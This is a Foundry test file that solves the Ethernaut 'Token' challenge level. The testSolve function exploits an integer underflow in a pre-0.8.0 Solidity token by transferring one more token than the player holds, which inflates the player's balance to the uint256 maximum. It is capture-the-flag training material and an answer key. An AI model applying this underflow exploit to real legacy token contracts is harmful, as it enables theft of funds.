// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DummyFactory} from "src/levels/DummyFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

interface Token {
    function transfer(address, uint256) external returns (bool);

    function balanceOf(address) external view returns (uint256);
}

contract TestTokenSolution is Test, Utils {
    Ethernaut ethernaut;
    Token instance;

    address payable owner;
    address payable player;
    address player2;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        player2 = makeAddr("player2");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DummyFactory factory = DummyFactory(getOldFactory("TokenFactory"));
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = Token(
            payable(createLevelInstance(ethernaut, Level(address(factory)), 0))
        );
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        // goal:
        // - hack the Token.sol contract

        // solution:
        // token contract is using a solidity version which is < 0.8.0
        // any solidity < 0.8.0 allows variables to over/underflow without reverting
        // for solving this we can transfer 1 more token than we own so our balance can be underflow and return type(uint256).max

        vm.startPrank(player);
        // starting balance 20
        console.log(instance.balanceOf(player));

        // send to player2(any other wallet) balance + 1 to create underflow and make uint256 max value of balance
        instance.transfer(player2, 21);

        // after overflow this will return type(unit256).max
        console.log(instance.balanceOf(player));

        assertGt(instance.balanceOf(player), 20);
    }
}
